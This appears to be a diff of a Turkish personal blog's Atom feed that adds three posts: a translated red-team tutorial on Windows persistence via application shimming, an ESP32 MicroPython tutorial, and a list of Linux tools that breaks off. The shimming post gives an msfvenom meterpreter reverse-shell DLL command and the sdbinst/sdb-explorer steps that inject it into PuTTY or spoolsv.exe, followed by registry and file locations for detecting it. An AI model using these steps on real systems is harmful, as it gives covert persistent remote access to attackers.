@@ -1,5 +1,231 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün | Personel homepage about of my Profession</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/all.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2019-06-03T13:30:00+03:00</updated><entry><title>Python Hafıza Yönetimi ve Garbage Collection Hakkında</title><link href="https://enesergun.net/python-garbage-collection.html" rel="alternate"></link><published>2019-06-03T13:30:00+03:00</published><updated>2019-06-03T13:30:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-06-03:/python-garbage-collection.html</id><summary type="html">&lt;h1&gt;Python Garbage Collector&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Enes Ergün</title><link href="https://enesergun.net/" rel="alternate"></link><link href="https://enesergun.net/feeds/all.atom.xml" rel="self"></link><id>https://enesergun.net/</id><updated>2019-12-21T15:00:00+03:00</updated><subtitle>Personel homepage about of my Profession</subtitle><entry><title>Application Shimming Kullanarak Windows Sistemler Üzerinde Kalıcılık</title><link href="https://enesergun.net/application-shimming-kullanarak-windows-sistemler-uzerinde-kalicilik.html" rel="alternate"></link><published>2019-12-21T15:00:00+03:00</published><updated>2019-12-21T15:00:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-12-21:/application-shimming-kullanarak-windows-sistemler-uzerinde-kalicilik.html</id><summary type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
+&lt;p&gt;Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar,&lt;/p&gt;
+&lt;p&gt;Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana kaynakla aynı değildir. &lt;/p&gt;
+&lt;h2&gt;Shimming Nedir?&lt;/h2&gt;
+&lt;p&gt;Windows sistemler üzerinde bir uygulamanın her sistemde çalışabilmesi adına çeşitli ayarlar barındıran bir dosyadır. &lt;code&gt;SDB&lt;/code&gt; dosyası olarak sistemler üzerinde tutulmaktadır. Dosya format olarak XML dosya formatındadır. Bu sayede sistemler üzerinde admin veya geliştiriciler yüklü uygulamalar üzerinde &lt;code&gt;Uyumluluk&lt;/code&gt; sorunlarını düzeltebiliyor veya patchleyebiliyorlar diyebiliriz.&lt;/p&gt;
+&lt;p&gt;Örnek bir SDB Dosyası: &lt;a href="https://github.com/williballenthin/python-sdb"&gt;Python-SDB&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Microsoft bu sebeple bir geliştirici kiti yayınlamıştır. Bu geliştirici kitinin ismi kısaca ADK'dır(Asssesment and Deployment Kit). 
+&lt;a href="https://go.microsoft.com/fwlink/?linkid=2086042"&gt;ADK'yı indirmek İçin Tıklayın&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Biz bu SDB Dosyası ile Ne yapacağız?&lt;/h2&gt;
+&lt;p&gt;Yukarıda bahsetmiş olduğum &lt;code&gt;Uyumluluk&lt;/code&gt; problemi için bu SDB dosyaları içerisinde InjectDLL diye bir seçenek bulundurmaktadır. Bunun sebebi geliştiricler eğer eski bir windows versiyonunda çalışacak uygulama varsa bu sisteme uygun DLL dosyasını uygulamaya dahil etmesini gerektirdiğindendir.&lt;/p&gt;
+&lt;p&gt;Windows 10 sisteme bazı uygulamaların açılabilmesi için .Net Framework 4.5 ile birlikte Net Framework 3.5 yüklemek gibi düşünebiliriz. (Sadece örnektir, geriye dönük uyumluluğun anlaşılabilmesi için vs.)&lt;/p&gt;
+&lt;p&gt;İşte bu InjectDLL özelliği bizim kullancağımız şeydir. Eğer biz burada bir uygulamaya istediğimiz bir DLL'i enjekte(!) edebilirsek bu sistem üzerinde kalıcılığı sağlamış oluruz. Üstelik görsel herhangi bir uyarı olmadan. &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; Defcon 23'de bu konuyu işleyen, gündeme getiren &lt;a href="https://twitter.com/secure_sean"&gt;Sean Pierce&lt;/a&gt;'in orjinal sunum/videosu için aşağıdaki linki kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.youtube.com/watch?v=LOsesi3QkXY"&gt;Abusing Native Shims for Post Exploitation&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Uygun bir DLL Dosyası Hazırlamak&lt;/h2&gt;
+&lt;p&gt;Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. &lt;/p&gt;
+&lt;p&gt;MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt; -f dll &amp;gt; pentestlab.dll
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek&lt;/h2&gt;
+&lt;p&gt;Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. &lt;/p&gt;
+&lt;p&gt;&lt;img alt="Windows ADK" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-combatibility-administrator.png"&gt;&lt;/p&gt;
+&lt;p&gt;Örnek üzerinde Putty kullanılmış. Putty kullanılmasının nedeni ise sıkça kullanılan küçük bir uygulama olması ve sistem yöneticileri vs tarafından şüphe çekmeyen bir uygulama olmamasından dolayıdır. Kendisi bir clientdır.(SSH, Telnet etc.)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Putty DLL Inject" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-create-application-fix.png"&gt;&lt;/p&gt;
+&lt;p&gt;Aşağıdaki ekran görüntüsünde yukarıdaki ekranda next dedikten sonra InjectDLL seçeneğini seçiyoruz ve Next diyoruz.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll.png"&gt;&lt;/p&gt;
+&lt;p&gt;Burada açılan ekranda ise InjectDLL'in bizden parametre isteyen ekranı açılacaktır. Bu ekranda &lt;code&gt;Command Line&lt;/code&gt; kısmına biraz önce oluşturduğumuz DLL dosyasının konumunu veriyoruz.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Options for InjectDLL" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png"&gt;&lt;/p&gt;
+&lt;p&gt;İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir &lt;code&gt;sdb&lt;/code&gt; dosyasına sahibiz. Buradan sonraki kısım ise bu &lt;code&gt;sdb&lt;/code&gt; dosyasını sisteme eklemek.&lt;/p&gt;
+&lt;p&gt;Bunun için &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sdbinst olusturdugunuzsdb.sdb
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="SDB Install" src="https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png"&gt;&lt;/p&gt;
+&lt;p&gt;Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. &lt;/p&gt;
+&lt;h2&gt;Arayüz Olmadan Enjekte Etmek&lt;/h2&gt;
+&lt;p&gt;Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde &lt;code&gt;spoolsv.exe&lt;/code&gt; dosyasına enjekte edilmiştir.&lt;/p&gt;
+&lt;h2&gt;Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?&lt;/h2&gt;
+&lt;p&gt;Sorunun kısa cevabı: Evet.
+Uzun cevap:&lt;/p&gt;
+&lt;p&gt;Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. &lt;/p&gt;
+&lt;p&gt;Bu klasöre ulaşmak için: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.&lt;/p&gt;
+&lt;h2&gt;Tespit etmek&lt;/h2&gt;
+&lt;p&gt;Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde &lt;code&gt;12&lt;/code&gt; event ID ile tetiklenecektir. &lt;/p&gt;
+&lt;p&gt;Registry konumları:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\&lt;/span&gt;
+&lt;span class="err"&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Dosya konumu:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;%WINDIR%\AppPatch\custom&lt;/span&gt;
+&lt;span class="c"&gt;%WINDIR%\AppPatch\AppPatch64\Custom&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Daha detaylı bir bilgi almak için Sean Price'ın &lt;a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf"&gt;sunumunu&lt;/a&gt; kullanabilirsiniz.&lt;/p&gt;
+&lt;p&gt;Okuduğum yazı:
+&lt;a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/"&gt;Persistence Application Shimming&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Yazı Sonu&lt;/h2&gt;
+&lt;p&gt;Konu nispeten eski bir konu fakat okuduğum kaynak yeni attığı için ben de çevirme ihtiyacı duydum o yüzden bu konuda bir eleştiri kabul etmeyeceğim :D Hoş kabul etsem de umurumda değil orası ayrı.&lt;/p&gt;
+&lt;p&gt;Bu yazıyı dün sabaha doğru yazdım ve planım yazı sonuna doğru kendi duygu/durum, ülkenin hali(Nolacak bu ülkenin hali yav?), arkadaşlık ilişkileri(Arkadaşlardan ziyade tanıdıklarım kavramı) gibi içimdeki bir çok şeyi yazı sonuna dökecektim fakat gerek olmadığını düşünüyorum. Yine bir klasik olarak şarkı ile bu yazının sonunu getirelim hem konuya, hem boşvermişliklere uygun olsun.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.youtube.com/watch?v=4eAQIXcvJ3A" title="Duygusal olmaya gerek yok"&gt;&lt;img alt="" src="http://img.youtube.com/vi/4eAQIXcvJ3A/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="siber güvenlik"></category><category term="Application Shimming"></category><category term="Red Team"></category><category term="Kırmızı Takım"></category><category term="Windows sistemlerde kalıcılık"></category><category term="Windows Pentest"></category><category term="Windows Kırmızı Takım"></category><category term="Windows Red Team"></category></entry><entry><title>ESP32 üzerinde Python yazmak - Micropython</title><link href="https://enesergun.net/esp32-ile-micropython.html" rel="alternate"></link><published>2019-05-27T12:00:00+03:00</published><updated>2019-05-27T12:00:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-05-27:/esp32-ile-micropython.html</id><summary type="html">&lt;p&gt;ESP32 ile nasıl çalışacağımıza ve cihaza hali hazırda daha önceki bir blog konusunda değinmiştik. &lt;/p&gt;
+&lt;p&gt;İlgili yazı linki: &lt;a href="https://enesergun.net/esp32-ile-calismak.html"&gt;ESP32 İle Çalışmak&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Yukarıda linkini vermiş olduğum yazıda ESP-IDF ve pip ile birlikte kurduğumuz ESPTool kullanıyorduk. İnternet üzerindeki bir çok elektronik konulu blog yazılarını incelediğinizde elektronik cihazlara ait kodlamaların genellikle C ile yazıldığını …&lt;/p&gt;</summary><content type="html">&lt;p&gt;ESP32 ile nasıl çalışacağımıza ve cihaza hali hazırda daha önceki bir blog konusunda değinmiştik. &lt;/p&gt;
+&lt;p&gt;İlgili yazı linki: &lt;a href="https://enesergun.net/esp32-ile-calismak.html"&gt;ESP32 İle Çalışmak&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Yukarıda linkini vermiş olduğum yazıda ESP-IDF ve pip ile birlikte kurduğumuz ESPTool kullanıyorduk. İnternet üzerindeki bir çok elektronik konulu blog yazılarını incelediğinizde elektronik cihazlara ait kodlamaların genellikle C ile yazıldığını görebilirsiniz. C bilmeyen birisi için(Örn:Ben) projeyi ilerlettikçe bu oldukça içinden çıkılamaz bir durum halini alabiliyor. İşte bu sebepledir ki bazı arkadaşlarımız elektronik cihazlar üzerinde Python yazabilmemize olanak sağlayan bir dil yazmışlar. Kendileri bu dili yine C ile yazmış olup ismine de &lt;strong&gt;MicroPython&lt;/strong&gt; ismini vermişler.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/micropython1.png"&gt;&lt;/p&gt;
+&lt;h2&gt;MicroPython Nedir?&lt;/h2&gt;
+&lt;p&gt;Kendileri ESP32 veya diğer boardlar üzerinde Python(Python'a benzer kod) kodu yazmamızı sağlayan bir dil. İçerisinde implente olmuş bir biçimde Python 3.4 kullanıyor fakat normal bir Python'a göre farklılıkları da bulunmuyor değil. &lt;/p&gt;
+&lt;p&gt;İlgili farklılıklara ulaşmak için: &lt;a href="http://docs.micropython.org/en/latest/genrst/index.html"&gt;MicroPython differences from CPython&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;MicroPython'ın desteklemiş olduğu boardlar: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Micro:bit&lt;/li&gt;
+&lt;li&gt;ESP8266&lt;/li&gt;
+&lt;li&gt;ESP32&lt;/li&gt;
+&lt;li&gt;Pyboard D-Series&lt;/li&gt;
+&lt;li&gt;WiPy ve CC3200&lt;/li&gt;
+&lt;li&gt;MicroPython pyboard&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;MicroPython'ı ESP32'ye Nasıl Yükleriz?&lt;/h2&gt;
+&lt;p&gt;Bunun için aslında çok fazla bir ihtiyacımız bulunmamaktadır. MicroPython'ı yüklemek için "bin" dosyasını flashlamamız yeterli.&lt;/p&gt;
+&lt;p&gt;Cihazınıza uygun firmware'i indirmek için : &lt;a href="https://micropython.org/download#esp32"&gt;MicroPython Firmware for ESP32&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Yukarıda verilmiş link üzerinden en son sürüm "bin" dosyasını indirmeniz gerekmektedir. İndirdikten sonra aşağıda verilmiş olan komut ile &lt;strong&gt;"Linux"&lt;/strong&gt;  üzerinde bu işlemi yapabilirsiniz. Değiştirilmesi gereken parametreler komut  altında açıklanacaktır.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo esptool.py --chip esp32 --port /dev/ttyUSB0 --baud &lt;span class="m"&gt;921600&lt;/span&gt; write_flash -z 0x1000 esp32-20190526-v1.10-387-g1470184bd.bin
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Değiştirilmesi gereken argümanlar/parametreler:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;esp32-20190526-v1.10-387-g1470184bd.bin&lt;/li&gt;
+&lt;li&gt;921600&lt;/li&gt;
+&lt;li&gt;İlgili değer baud değeridir. Bu değer saniye başı serial port üzerinden transfer edilebilecek bit sayısını belli etmektedir. flash atarken bu değerle yazdırdık, dinlerkende 115200 baud değerinde dinleme yapmamız gerekmektedir. &lt;/li&gt;
+&lt;li&gt;/dev/ttyUSB0&lt;/li&gt;
+&lt;li&gt;İlgili değer ise ESP32 cihazınızın hangi portundan bağlandığını göstermektedir.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Yükledikten Sonra Nasıl Kod Yazacağız?&lt;/h2&gt;
+&lt;p&gt;Şimdi her şeyi yükledik. Ama kodu nasıl yazacağız derseniz terminal'e aşağıdaki komutu yazmanız yeterlidir.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;screen /dev/ttyUSB1 115200&lt;/code&gt; &lt;/p&gt;
+&lt;p&gt;2 kere enter'a bastığınızda direkt olarak interactive prompt'a düşeceksinizdir. Örnek bir ekran görüntüsünü aşağıya ekliyor olacağım.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Micropython Türkçe" src="images/micropython3.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Micropython Türkçe" src="images/micropython4.png"&gt;&lt;/p&gt;
+&lt;p&gt;Eğer bu şekilde(REPL) kod yazmak hoşunuza gitmiyorsa yazdığınız kodu ampy(dilerseniz rshell) ile ESP32 Boardınıza yükleyebilirsiniz.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo ampy --port /dev/ttyUSB0 put main.py&lt;/code&gt; &lt;/p&gt;
+&lt;p&gt;Ampy ile attığımız kod artık her boot edilişte otomatik olarak çalışacaktır.&lt;/p&gt;
+&lt;p&gt;Ben aşağıdaki kodu attım ve sürekli çalışmasını sonsuz bir while döngüsü ile sağladım. Eğer sıcaklık 30 derece üstüne çıkarsa bize haber verecektir. Ekran görüntüsünü de aşağıda gösteriyor olacağım.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;dht&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;machine&lt;/span&gt;
+&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dht&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DHT11&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;machine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Pin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;temperature&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Çok sıcak acil durum olarak API bilgi gönderildi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;break&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Oda sıcaklığındayız mükemmel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Micropython Türkçe" src="images/micropython5.png"&gt;&lt;/p&gt;
+&lt;p&gt;Bu yazı şimdilik bu kadar. Belki ileride (üşenmezsem) ESP32 üzerinden sürekli olarak sıcaklık değerlerini ağda bulunan bir API'a alarak onun veri görselleştirmesini yapabiliriz veya bir sunucu odasında olduğumuzu düşünüp belirli bir sıcaklık üstüne çıktığında farklı bir porttan veri göndermesini sağlayabiliriz.&lt;/p&gt;
+&lt;p&gt;Okuduğunuz için teşekkür ederim. Yine bir klasik olarak şarkı paylaşacağım fakat bu sefer yine 2 tane paylaşacağım.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.youtube.com/watch?v=5hNT2wtVIBI" title="Nothing burns like the cold"&gt;&lt;img alt="Nothing burns like the 
+cold" src="http://img.youtube.com/vi/5hNT2wtVIBI/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://www.youtube.com/watch?v=1gdihQ_cnfQ" title="Biig Piig Perdida"&gt;&lt;img alt="Biig Piig 
+Perdida" src="http://img.youtube.com/vi/1gdihQ_cnfQ/0.jpg"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="iot &amp; elektronik"></category><category term="esp32 türkçe"></category><category term="micropython türkçe"></category><category term="esp32 micropython türkçe"></category><category term="esp32 ile micropython kullanmak"></category><category term="python ve elektronik"></category><category term="elektronik aletlerde python yazmak"></category></entry><entry><title>Linux Üzerinde Kullandığım ve Tavsiye Ettiğim Uygulamalar</title><link href="https://enesergun.net/linux-uzerinde-kullandigim-uygulamalar.html" rel="alternate"></link><published>2019-05-03T20:00:00+03:00</published><updated>2019-05-03T20:00:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2019-05-03:/linux-uzerinde-kullandigim-uygulamalar.html</id><summary type="html">&lt;p&gt;Selamlar, &lt;/p&gt;
+&lt;p&gt;Uzun süredir kendimi oyunlara verdiğimden dolayı kendimi geliştirmek adına bir şey yapmadığımı farkettim, belki de daha önce farkettim ama ihtiyacım vardı bilemiyorum. Bu sebeple 3 gün önce radikal bir karar alarak Windows sistemimi geri gelmeyecek şekilde (diskimi 0 ile dolduracak şekilde) sildim. Hoş SSD için böyle bir data destruction'a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Selamlar, &lt;/p&gt;
+&lt;p&gt;Uzun süredir kendimi oyunlara verdiğimden dolayı kendimi geliştirmek adına bir şey yapmadığımı farkettim, belki de daha önce farkettim ama ihtiyacım vardı bilemiyorum. Bu sebeple 3 gün önce radikal bir karar alarak Windows sistemimi geri gelmeyecek şekilde (diskimi 0 ile dolduracak şekilde) sildim. Hoş SSD için böyle bir data destruction'a gerek var mı bilmiyorum fakat yaptım. Hatta öyle bir radikal karar ki şuan kullandığım sisteme Steam'e dair herhangi bir şey kurmadım.&lt;/p&gt;
+&lt;p&gt;Velhasılkelam. Sistem olarak herkes tarafından linç yediğim bir dağıtım kurdum(Kali). Tabi gerekli ayarlamaları yaparak. Neden kali kurdum sorusuna gelirsek:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hackthebox ile uğraşmak istiyorum.&lt;/li&gt;
+&lt;li&gt;Sanalda bir sistem kullanmaktan nefret ediyorum.&lt;/li&gt;
+&lt;li&gt;İhtiyacım olabilecek her şeyin elimin altında olmasını istiyorum. (Toollar)&lt;/li&gt;
+&lt;li&gt;Uygulamaları tek tek kurmak istemiyorum (GOTO [2] veya direkt 1 den başlıyorsanız GOTO[3])&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Girizgahı geçelim. Bu yazıyı neden yazdım? Hem kendi işlerim için kullandığım (Pentest harici onlar başka bir yazı konusu) hemde yeni görüp beğendiğim yazılımları paylaşmak istedim.&lt;/p&gt;
+&lt;h2&gt;Yeni Neler Buldum&lt;/h2&gt;
+&lt;h3&gt;Flog&lt;/h3&gt;
+&lt;p&gt;Kendisi GOLang ile yazılmış bir araç olmak ile birlikte bir çok standart formatta sahte log üretebiliyor. Bu sahte loglar geliştirdiğimiz uygulamalar için yararlı olabiliyor veya ihtiyacımız olduğunda bu şekilde log üretebiliyor olmamız mükemmel bir şey. Eğer Log'lar üzerinde bir iş veya proje yapıyorsanız kesinlikle kullanmalısınız.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/mingrammer/flog"&gt;Flog Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Glances&lt;/h3&gt;
+&lt;p&gt;Kendisi htop gibi bir monitoring aracı fakat biraz daha gelişmiş ve işlevsel hali. Aklınıza gelebilecek temel sistemleri izliyor. Bunlar Disk I/O, Network, Processler, Memory durumu, Swap durumu, System load durumu gibi şeyler.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://nicolargo.github.io/glances/"&gt;Glances Official Sitesi&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Flameshot&lt;/h3&gt;
+&lt;p&gt;Kendisi benim bundan sonra vazgeçilmezim olacak bir screenshooter yazılımı. Bundan önce XFCE üzerinde kendi screenshooter'ı olan xfce4-screenshooter'ı kullanmakla birlikte onun yetersiz geldiği yerlerde Shutter kullanıyordum fakat Shutter'dan nedense nefret ediyordum. İşte şuan imdadıma &lt;code&gt;Flameshot&lt;/code&gt; yetişti.&lt;/p&gt;
+&lt;p&gt;Kendisi Windows üzerinde kullandığım &lt;code&gt;Greenshot&lt;/code&gt; uygulamasının bir çok özelliğine sahip üstelik bunu SS aldığınız yerde yapıyorsunuz, başka herhangi bir pencere ile uğraşmıyorsunuz.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Bu arada xfce4-screenshooter'ın Telegram'a resim gönderirken donma sorununun allah belasını versin.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/lupoDharkael/flameshot"&gt;FlameShot Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Kupfer&lt;/h3&gt;
+&lt;p&gt;Kendisi bir uygulama başlatıcı. XFCE4 sistemlerde ben genellikle start menüyü kullanmayı sevmiyordum. Mouse'u oraya götür uygulamayı bul tıkla bana zor geliyordu bu sebeple &lt;code&gt;xfce4-appfinder&lt;/code&gt;  uygulamasını kullanıyordum. Öyle muhabbet ortasında konuşurken &lt;code&gt;1v3m&lt;/code&gt; adlı arkadaşa &lt;code&gt;erfur&lt;/code&gt; &lt;code&gt;kupfer&lt;/code&gt; diye bir uygulama önermiş. Sağolsun &lt;code&gt;1v3m&lt;/code&gt; de bana önerdi. (Amma çok mention oldu.) Kendisini severek kullanmaktayız efendim. Tavsiye ederiz.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://kupferlauncher.github.io/"&gt;Kupfer Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Cheat&lt;/h3&gt;
+&lt;p&gt;Kendisi, terminal üzerinde kendi cheatsheetlerimizi hazırlamaya yarayan bir araç. Tabi kendi içerisinde de bir sürü cheatsheet default olarak bulunuyor. Bunları home klasörünüz altında &lt;code&gt;cheat&lt;/code&gt; klasörüne atarsanız terminalden &lt;code&gt;cheat bash&lt;/code&gt; yazdığınızda size vermiş olduğunuz argümana göre cheatsheet gösteriyor. Gayet güzel bir uygulama&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/cheat/cheat"&gt;Cheat Github Linki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Add-Gitignore&lt;/h3&gt;
